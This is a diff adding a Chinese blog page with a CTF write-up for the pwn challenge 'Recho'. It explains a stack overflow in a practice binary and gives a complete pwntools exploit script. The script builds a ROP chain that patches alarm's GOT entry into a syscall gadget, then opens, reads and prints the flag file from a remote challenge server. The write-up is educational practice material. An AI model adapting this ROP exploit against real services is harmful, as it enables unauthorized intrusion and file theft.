@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Recho - Luexp</title><meta name="Description" content="Luexp&#39;s blog"><meta property="og:title" content="Recho" />
+<meta property="og:description" content="涉及知识
+
+pwntools终止输入
+syscall系统调用open
+fd第一个文件为3，第二个为4
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/recho/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-03-27T22:32:15+00:00" />
+<meta property="article:modified_time" content="2020-03-27T22:32:15+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Recho"/>
+<meta name="twitter:description" content="涉及知识
+
+pwntools终止输入
+syscall系统调用open
+fd第一个文件为3，第二个为4
+"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/recho/" /><link rel="prev" href="http://example.org/1000levels/" /><link rel="next" href="http://example.org/noleak/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Recho",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/recho\/"
+        },"genre": "posts","keywords": "pwn, wp","wordcount":  659 ,
+        "url": "http:\/\/example.org\/recho\/","datePublished": "2020-03-27T22:32:15+00:00","dateModified": "2020-03-27T22:32:15+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Luexp"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="GO!"> 文章 </a><a class="menu-item" href="/tags/" title="BIU!"> 标签 </a><a class="menu-item" href="/categories/" title="BOOM!"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="GO!">文章</a><a class="menu-item" href="/tags/" title="BIU!">标签</a><a class="menu-item" href="/categories/" title="BOOM!">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Recho</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Luexp</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-03-27">2020-03-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 659 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#保护机制">保护机制</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="涉及知识">涉及知识</h1>
+<ul>
+<li>pwntools终止输入</li>
+<li>syscall系统调用open</li>
+<li>fd第一个文件为3，第二个为4</li>
+</ul>
+<h1 id="程序分析">程序分析</h1>
+<h2 id="保护机制">保护机制</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/4hqNepXQWM6cVxu.png"
+        data-srcset="https://i.loli.net/2020/05/20/4hqNepXQWM6cVxu.png, https://i.loli.net/2020/05/20/4hqNepXQWM6cVxu.png 1.5x, https://i.loli.net/2020/05/20/4hqNepXQWM6cVxu.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/4hqNepXQWM6cVxu.png"
+        title="image.png" /></p>
+<p>开启NX和部分RELRO</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/5ifcX6DMPGNvKhk.png"
+        data-srcset="https://i.loli.net/2020/05/20/5ifcX6DMPGNvKhk.png, https://i.loli.net/2020/05/20/5ifcX6DMPGNvKhk.png 1.5x, https://i.loli.net/2020/05/20/5ifcX6DMPGNvKhk.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/5ifcX6DMPGNvKhk.png"
+        title="image.png" /></p>
+<p>程序逻辑很简单，就是一个简单的栈溢出。v7是任意输入的一个整型变量，其决定了读入的数据值，所以可以读入任意长度的值。</p>
+<p>但是程序是一个死循环，只有结束了read函数后，才会跳出。ctrl + d 可以结束read函数。pwntools的shutdown(&lsquo;send&rsquo;)函数同样可以结束read函数，但是结束之后，就不能再输入payload，故我们需要一次性达到目的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/TsSn67owYLClaxG.png"
+        data-srcset="https://i.loli.net/2020/05/20/TsSn67owYLClaxG.png, https://i.loli.net/2020/05/20/TsSn67owYLClaxG.png 1.5x, https://i.loli.net/2020/05/20/TsSn67owYLClaxG.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/TsSn67owYLClaxG.png"
+        title="image.png" /></p>
+<p>在gdb中，给alarm打下断点，可以发现在alarm+5处有syscall系统调用可以使用。再结合flag字符串，我们很容易想到用open函数将flag文件中的值给读出来。</p>
+<p>获得fd后，用write函数将fd中的值写入bss段中，这里选用.bss+0x500。存入.bss后，我们用printf函数或则read函数，将.bss中的内容给显示在屏幕上。</p>
+<p>需要使用的gadget用ROPgadget来获得。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/HgrikXN59VLnWyc.png"
+        data-srcset="https://i.loli.net/2020/05/20/HgrikXN59VLnWyc.png, https://i.loli.net/2020/05/20/HgrikXN59VLnWyc.png 1.5x, https://i.loli.net/2020/05/20/HgrikXN59VLnWyc.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/HgrikXN59VLnWyc.png"
+        title="image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/05/20/EbaYKXVB1jWMRI5.png"
+        data-srcset="https://i.loli.net/2020/05/20/EbaYKXVB1jWMRI5.png, https://i.loli.net/2020/05/20/EbaYKXVB1jWMRI5.png 1.5x, https://i.loli.net/2020/05/20/EbaYKXVB1jWMRI5.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/05/20/EbaYKXVB1jWMRI5.png"
+        title="image.png" /></p>
+<h1 id="exp">EXP</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+
+<span class="c1">#sh=process(&#39;./xctf&#39;)</span>
+<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;111.198.29.45&#39;</span><span class="p">,</span><span class="mi">34291</span><span class="p">)</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./xctf&#39;</span><span class="p">)</span>
+<span class="c1">#one gadget6</span>
+<span class="n">pop_rdi_ret</span><span class="o">=</span><span class="mh">0x4008a3</span>
+<span class="n">pop_rsi_pop_r15_ret</span><span class="o">=</span><span class="mh">0x4008a1</span> 
+<span class="n">pop_rdx_ret</span><span class="o">=</span><span class="mh">0x4006fe</span>
+<span class="n">pop_rax_ret</span><span class="o">=</span><span class="mh">0x4006fc</span> 
+<span class="n">add_rdi_ret</span><span class="o">=</span><span class="mh">0x40070d</span> 
+
+<span class="n">flag</span><span class="o">=</span><span class="mh">0x601058</span>
+<span class="n">alarm_got</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;alarm&#39;</span><span class="p">]</span>
+<span class="n">alarm</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;alarm&#39;</span><span class="p">]</span>
+<span class="n">bss</span><span class="o">=</span><span class="mh">0x601090</span>
+<span class="n">read</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+<span class="n">printf</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+<span class="c1">#make payload</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span>
+
+<span class="c1">#alarm_got=syscall</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">alarm_got</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">add_rdi_ret</span><span class="p">)</span>
+
+<span class="c1">#open(flag,READONLY)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">alarm</span><span class="p">)</span>
+
+<span class="c1">#read(flag,bss,50)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_pop_r15_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x500</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+
+<span class="c1">#printf(bss)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x500</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">printf</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;server!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x200</span><span class="p">))</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="s1">&#39;send&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="反思">反思</h1>
+<p>没想到syscall可以在alarm中寻找，以及将alarm_got值加5的骚操作。这道题应该算把ROP技术发挥的淋漓尽致，fd的值第一次是3，第二次是4，依次递增是一个知识盲点。</p>
+<h2 id="参考">参考</h2>
+<p><a href="https://blog.csdn.net/xidoo1234/article/details/104532070" target="_blank" rel="noopener noreffer">SCDN</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-03-27</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/recho/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/recho/" data-title="Recho" data-via="xx" data-hashtags="pwn,wp"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/recho/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://example.org/recho/" data-title="Recho" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://example.org/recho/" data-title="Recho"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/recho/" data-title="Recho"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://example.org/recho/" data-title="Recho" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://example.org/recho/" data-title="Recho" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://example.org/recho/" data-title="Recho"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/wp/">wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/1000levels/" class="prev" rel="prev" title="1000levels"><i class="fas fa-angle-left fa-fw"></i>1000levels</a>
+            <a href="/noleak/" class="next" rel="next" title="Noleak">Noleak<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Luexp</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
